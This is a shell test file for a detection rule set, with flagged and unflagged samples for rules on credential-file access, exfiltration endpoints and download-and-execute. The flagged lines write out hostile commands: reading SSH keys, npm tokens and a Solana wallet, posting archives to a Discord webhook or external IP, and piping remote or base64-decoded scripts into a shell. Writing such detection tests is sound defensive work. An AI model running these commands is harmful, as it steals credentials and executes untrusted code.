#!/bin/sh
# Test cases for generic.yaml. Harmless samples: nothing here is executed.

# ruleid: credential-file-access
cat ~/.ssh/id_ed25519
# ruleid: credential-file-access
cp "$HOME/.npmrc" /tmp/x
# ruleid: credential-file-access
tar czf /tmp/w.tgz "$HOME/.config/solana/id.json"
# ok: credential-file-access
cat ./config/settings.json

# ruleid: exfiltration-endpoint
curl -d @/tmp/w.tgz https://discord.com/api/webhooks/1/abc
# ruleid: exfiltration-endpoint
curl https://abc123.oast.fun/
# ruleid: exfiltration-endpoint
curl http://203.0.113.7:8080/upload
# ok: exfiltration-endpoint
curl http://127.0.0.1:8000/health
# ok: exfiltration-endpoint
curl https://horizon-testnet.stellar.org/

# ruleid: download-and-execute
curl -fsSL https://example.invalid/install.sh | sh
# ruleid: download-and-execute
wget -qO- https://example.invalid/x | sudo bash
# ruleid: download-and-execute
echo aWQK | base64 -d | sh
# ruleid: download-and-execute
bash -c "$(curl -fsSL https://example.invalid/x)"
# ok: download-and-execute
curl -fsSLo osv-scanner https://github.com/google/osv-scanner/releases/download/v2.7.0/osv-scanner_linux_amd64
